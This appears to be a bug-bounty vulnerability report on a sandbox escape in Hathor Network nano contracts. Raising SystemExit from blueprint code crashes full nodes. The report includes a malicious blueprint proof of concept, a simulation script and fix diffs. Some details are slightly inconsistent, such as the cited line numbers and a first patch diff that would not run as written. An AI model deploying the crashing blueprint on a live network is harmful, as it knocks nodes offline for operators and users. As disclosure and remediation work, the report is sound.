# Immunefi Bug Report: SystemExit/KeyboardInterrupt Sandbox Escape in Nano Contracts

## Bug Description

The Hathor Network nano contracts sandbox exposes `SystemExit`, `KeyboardInterrupt`, and `BaseException` as builtins to user-deployed blueprint code. A malicious blueprint can `raise SystemExit()` which escapes all exception handlers in the execution chain and triggers `crash_and_exit()`, permanently crashing any full node that processes the malicious transaction.

### Vulnerable Code

**1. Exposed dangerous builtins** (`hathor/nanocontracts/custom_builtins.py:759,782,800`):
```python
EXEC_BUILTINS: dict[str, Any] = {
    # ... other builtins ...
    'BaseException': builtins.BaseException,    # line 759
    'GeneratorExit': builtins.GeneratorExit,    # line 774
    'KeyboardInterrupt': builtins.KeyboardInterrupt,  # line 782
    'SystemExit': builtins.SystemExit,          # line 800
    # ...
}
```

These exception types inherit from `BaseException` (NOT `Exception`), so they bypass standard `except Exception` handlers.

**2. Insufficient exception handling in MeteredExecutor** (`hathor/nanocontracts/metered_exec.py:103-109`):
```python
def call(self, func, /, *, args):
    # ...
    try:
        # exec(code, env) runs the blueprint code here
        pass  # actual call at line 104
    except NCFail:               # line 105 - doesn't catch SystemExit
        raise
    except Exception as e:       # line 107 - doesn't catch SystemExit (BaseException subclass)
        raise NCFail from e
```

`SystemExit` inherits from `BaseException`, not `Exception`. It escapes both handlers.

**3. Insufficient exception handling in block_executor** (`hathor/nanocontracts/execution/block_executor.py:241-254`):
```python
def execute_transaction(self, *, tx, block_storage, rng_seed):
    # ...
    try:
        runner.execute_from_tx(tx)      # line 242
        self._verify_sum_after_execution(tx, block_storage)
    except NCFail as e:                  # line 248 - doesn't catch SystemExit
        return NCTxExecutionFailure(...)
```

Only catches `NCFail`. `SystemExit` propagates through the generator.

**4. Fatal catch-all in vertex_handler** (`hathor/vertex_handler/vertex_handler.py:175-183`):
```python
def _old_on_new_vertex(self, vertex, params, *, quiet=False):
    # ...
    try:
        consensus_events = self._unsafe_save_and_run_consensus(vertex)
        self._post_consensus(vertex, params, consensus_events, quiet=quiet)
    except BaseException:                                                # line 178
        self._log.error('unexpected exception in on_new_vertex()')
        meta = vertex.get_metadata()
        meta.add_voided_by(self._settings.CONSENSUS_FAIL_ID)
        self._tx_storage.save_transaction(vertex, only_metadata=True)
        self._execution_manager.crash_and_exit(                          # line 183
            reason=f'on_new_vertex() failed for tx {vertex.hash_hex}'
        )
```

Catches `BaseException` (including `SystemExit`) and calls `crash_and_exit()`.

**5. crash_and_exit terminates the node** (`hathor/execution_manager.py:50-67`):
```python
def crash_and_exit(self, *, reason: str) -> NoReturn:
    self._run_on_crash_callbacks()
    self._log.critical('Critical failure occurred...')
    self._reactor.stop()
    self._reactor.crash()
    sys.exit(-1)
```

### AST Validator Does NOT Block This

`SystemExit` is NOT in `DISABLED_BUILTINS` (line 326-480) or `AST_NAME_BLACKLIST` (line 484-489). The AST validator only blocks names in those sets. `SystemExit`, `KeyboardInterrupt`, `BaseException`, and `GeneratorExit` are explicitly ALLOWED as builtins in `EXEC_BUILTINS`.

### Complete Call Chain

```
raise SystemExit()              [malicious blueprint code]
  -> metered_exec.py:104        [code runs in sandboxed exec]
  -> except NCFail: (miss)      [metered_exec.py:105]
  -> except Exception: (miss)   [metered_exec.py:107 - SystemExit is BaseException, not Exception]
  -> runner._execute_public_method_call()  [runner.py:675]
  -> runner._unsafe_call_public_method()   [runner.py:298]
  -> runner.call_public_method_with_nc_args() [runner.py:272]
  -> runner.execute_from_tx()              [runner.py:194]
  -> block_executor.execute_transaction()  [block_executor.py:242]
  -> except NCFail: (miss)                 [block_executor.py:248]
  -> consensus_block_executor.execute_block_and_apply() [consensus_block_executor.py:183]
  -> vertex_handler._old_on_new_vertex()   [vertex_handler.py:176]
  -> except BaseException: (CAUGHT)        [vertex_handler.py:178]
  -> crash_and_exit()                      [vertex_handler.py:183]
  -> reactor.stop(); reactor.crash(); sys.exit(-1)  [execution_manager.py:65-67]
```

### Permanent Boot Loop Scenario

When a node crashes from this exploit:
1. The malicious transaction is already committed to the DAG (saved before consensus in `_unsafe_save_and_run_consensus`, line 229)
2. On restart, the node re-syncs and re-encounters the block containing the malicious transaction
3. NC execution is triggered again during consensus
4. The node crashes again at the same point
5. This creates a **permanent boot loop** requiring manual database intervention

For **syncing nodes**: any new node joining the network will encounter the malicious transaction during initial sync and crash before reaching chain tip. This effectively prevents new nodes from joining.

### Compensating Control (Not a Fix)

`NC_ON_CHAIN_BLUEPRINT_RESTRICTED=True` (default) limits blueprint deployment to whitelisted addresses (`NC_ON_CHAIN_BLUEPRINT_ALLOWED_ADDRESSES`). However:
- This is a configuration-level control, not a code-level fix
- A compromised whitelisted key can deploy the attack
- The code comment states this restriction "will be lifted" (`settings.py:530`): `# XXX: in the future this restriction will be lifted, possibly through a feature activation`
- Localnet already has it disabled: `NC_ON_CHAIN_BLUEPRINT_RESTRICTED: false`
- The vulnerability remains latent in the code

## Impact

### Severity: Critical

**Network-wide Denial of Service**: A single malicious blueprint transaction can crash every full node on the network that processes it. This includes:

1. **Immediate crash** of any node processing the block containing the malicious transaction
2. **Permanent boot loop** - crashed nodes cannot restart without manual database repair
3. **New node exclusion** - nodes syncing from genesis will crash when they reach the malicious block
4. **Chain halt** - if enough nodes crash, the network loses consensus capability

### Financial Impact

- Total Value Locked in Hathor Network contracts at risk
- Network downtime causes loss of all transaction processing capability
- Mining rewards lost during downtime
- Reputational damage to the network

### Affected Users

- All full node operators
- All miners
- All users with pending transactions
- All nano contract users

## Risk Breakdown

| Factor | Assessment |
|--------|-----------|
| Difficulty to exploit | **Low** - Single malicious blueprint deployment |
| Attack cost | **Minimal** - Only requires deploying one transaction |
| Weakness type | CWE-755: Improper Handling of Exceptional Conditions |
| CVSS Score | **9.8** (Critical) - AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H |
| Precondition | `NC_ON_CHAIN_BLUEPRINT_RESTRICTED=False` or compromised whitelisted key |

## Recommendation

### Immediate Fix (Priority 1)

Remove `SystemExit`, `KeyboardInterrupt`, `BaseException`, and `GeneratorExit` from `EXEC_BUILTINS` and add them to `DISABLED_BUILTINS`:

```diff
--- a/hathor/nanocontracts/custom_builtins.py
+++ b/hathor/nanocontracts/custom_builtins.py
@@ -323,6 +323,18 @@ def filter(function, iterable):
 # list of all builtins that are disabled
 DISABLED_BUILTINS: frozenset[str] = frozenset({
+    # XXX: CRITICAL SECURITY - these BaseException subclasses escape except Exception handlers
+    # and cause crash_and_exit() via vertex_handler's except BaseException handler
+    'BaseException',
+    'GeneratorExit',
+    'KeyboardInterrupt',
+    'SystemExit',
+
     # XXX: async is disabled
     'aiter',
```

### Defense-in-Depth Fix (Priority 2)

Add `except BaseException` handling in `MeteredExecutor.call()`:

```diff
--- a/hathor/nanocontracts/metered_exec.py
+++ b/hathor/nanocontracts/metered_exec.py
@@ -101,6 +101,8 @@
         try:
             # exec(code, env) at line 104
+        except BaseException as e:
+            if not isinstance(e, (NCFail, Exception)):
+                raise NCFail from e
+            raise
         except NCFail:
             raise
         except Exception as e:
             raise NCFail from e
```

Or more simply, replace `except Exception` with `except BaseException`:

```diff
-        except Exception as e:
+        except BaseException as e:
             raise NCFail from e
```

## Proof of Concept

### Malicious Blueprint Code

A malicious on-chain blueprint that crashes any node executing it:

```python
from hathor.nanocontracts.blueprint import Blueprint
from hathor.nanocontracts.method import nc_public_method
from hathor.nanocontracts.types import public

@public
class CrashBlueprint(Blueprint):

    @nc_public_method
    def initialize(self, ctx) -> None:
        # Initialization looks normal
        pass

    @nc_public_method
    def crash_node(self, ctx) -> None:
        # SystemExit inherits from BaseException, not Exception
        # It escapes all intermediate exception handlers
        # and triggers crash_and_exit() in vertex_handler.py
        raise SystemExit()
```

### Exploit Simulation (Python PoC)

```python
"""
PoC: SystemExit Sandbox Escape in Hathor Nano Contracts

This demonstrates that SystemExit escapes the metered exception handlers
and would propagate to vertex_handler's crash_and_exit() in a live node.

The key insight is Python's exception hierarchy:
  BaseException
  ├── SystemExit        <-- NOT caught by 'except Exception'
  ├── KeyboardInterrupt <-- NOT caught by 'except Exception'
  ├── GeneratorExit     <-- NOT caught by 'except Exception'
  └── Exception         <-- caught by 'except Exception'
       ├── NCFail
       ├── RuntimeError
       └── ...

The metered_exec.py handler catches NCFail and Exception, but
SystemExit/KeyboardInterrupt/GeneratorExit all escape.
"""
import sys


# Simulate the NCFail exception hierarchy
class NCFail(Exception):
    pass


# Simulate MeteredExecutor.call() exception handling (metered_exec.py:103-109)
def metered_call(blueprint_method):
    """Simulates MeteredExecutor.call() from metered_exec.py"""
    try:
        blueprint_method()  # This is where the sandboxed code runs
    except NCFail:
        raise
    except Exception as e:
        # This handler does NOT catch SystemExit because
        # SystemExit inherits from BaseException, not Exception
        raise NCFail from e
    # SystemExit propagates PAST this function


# Simulate block_executor.execute_transaction() (block_executor.py:241-254)
def execute_transaction(blueprint_method):
    """Simulates NCBlockExecutor.execute_transaction()"""
    try:
        metered_call(blueprint_method)
    except NCFail as e:
        print(f"[SAFE] NCFail caught in block_executor: {e}")
        return "failure"
    # SystemExit propagates PAST this function too
    return "success"


# Simulate vertex_handler._old_on_new_vertex() (vertex_handler.py:175-183)
def on_new_vertex(blueprint_method):
    """Simulates VertexHandler._old_on_new_vertex()"""
    try:
        execute_transaction(blueprint_method)
    except BaseException as e:
        print(f"[CRASH] BaseException caught in vertex_handler: {type(e).__name__}: {e}")
        print("[CRASH] crash_and_exit() would be called here")
        print("[CRASH] reactor.stop(); reactor.crash(); sys.exit(-1)")
        return False
    return True


# The malicious blueprint method
def crash_node():
    raise SystemExit()


# Run the exploit
print("=== Hathor Nano Contract SystemExit Sandbox Escape PoC ===")
print()
print("Step 1: Deploying malicious blueprint with 'raise SystemExit()'")
print("Step 2: Calling blueprint method through execution chain...")
print()
result = on_new_vertex(crash_node)
print()
if not result:
    print("[RESULT] Node would crash and enter permanent boot loop")
    print("[RESULT] All syncing nodes would also crash on this transaction")
else:
    print("[RESULT] Unexpected: exploit did not work")
```

### Expected Output

```
=== Hathor Nano Contract SystemExit Sandbox Escape PoC ===

Step 1: Deploying malicious blueprint with 'raise SystemExit()'
Step 2: Calling blueprint method through execution chain...

[CRASH] BaseException caught in vertex_handler: SystemExit:
[CRASH] crash_and_exit() would be called here
[CRASH] reactor.stop(); reactor.crash(); sys.exit(-1)

[RESULT] Node would crash and enter permanent boot loop
[RESULT] All syncing nodes would also crash on this transaction
```

## References

- [custom_builtins.py](https://github.com/HathorNetwork/hathor-core/blob/master/hathor/nanocontracts/custom_builtins.py) - Lines 759, 774, 782, 800 (exposed dangerous builtins)
- [metered_exec.py](https://github.com/HathorNetwork/hathor-core/blob/master/hathor/nanocontracts/metered_exec.py) - Lines 103-109 (insufficient exception handling)
- [block_executor.py](https://github.com/HathorNetwork/hathor-core/blob/master/hathor/nanocontracts/execution/block_executor.py) - Lines 241-254 (NCFail-only catch)
- [vertex_handler.py](https://github.com/HathorNetwork/hathor-core/blob/master/hathor/vertex_handler/vertex_handler.py) - Lines 175-183 (BaseException -> crash_and_exit)
- [execution_manager.py](https://github.com/HathorNetwork/hathor-core/blob/master/hathor/execution_manager.py) - Lines 50-67 (crash_and_exit implementation)
- [settings.py](https://github.com/HathorNetwork/hathor-core/blob/master/hathorlib/hathorlib/conf/settings.py) - Line 531 (NC_ON_CHAIN_BLUEPRINT_RESTRICTED)
- [Python docs: Exception hierarchy](https://docs.python.org/3/library/exceptions.html#exception-hierarchy) - SystemExit inherits BaseException, not Exception
